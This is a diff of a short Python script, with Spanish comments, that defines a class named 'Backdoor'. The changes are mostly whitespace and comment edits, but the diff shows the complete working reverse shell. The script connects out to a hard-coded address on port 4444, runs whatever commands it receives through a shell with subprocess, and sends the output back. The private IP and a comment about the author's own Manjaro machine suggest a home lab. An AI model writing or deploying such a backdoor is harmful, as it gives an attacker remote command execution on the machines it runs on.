@@ -10,12 +10,12 @@ import socket, subprocess, sys
 
 class Backdoor:
 
-    def __init__(self,ip,port):
+    def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip,port))  # ← ✅ IP CORRECTA (tu Manjaro)
+        self.connection.connect((ip, port))
         self.connection.send(b" \n [+]Conexion Exitosamente Establecida \n")
 
-    def ejecutarComando(self,command):
+    def ejecutarComando(self, command):
         try:
             command_str = command.decode('utf-8', errors='ignore').strip()
             return subprocess.check_output(command_str, shell=True, stderr=subprocess.STDOUT)
@@ -24,18 +24,17 @@ class Backdoor:
             return str(e).encode('utf-8')
 
     def run(self):
-        while True: 
+        while True:
             command = self.connection.recv(1024000)
-            command_str = command.decode('utf-8', errors='ignore').strip()  # ← ✅ DECODIFICAR
+            command_str = command.decode('utf-8', errors='ignore').strip()
             
-            # ← ✅ CHECK ANTES DE EJECUTAR
+            # ← ✅ CHECK "salir" ANTES DE EJECUTAR
             if command_str == "salir":
                 self.connection.close()
                 exit()
             
             resultadosComando = self.ejecutarComando(command)
-            self.connection.send(resultadosComando)           
+            self.connection.send(resultadosComando)
 
-
-puerta = Backdoor("192.168.1.33",4444)
+puerta = Backdoor("192.168.1.33", 4444)
 puerta.run()
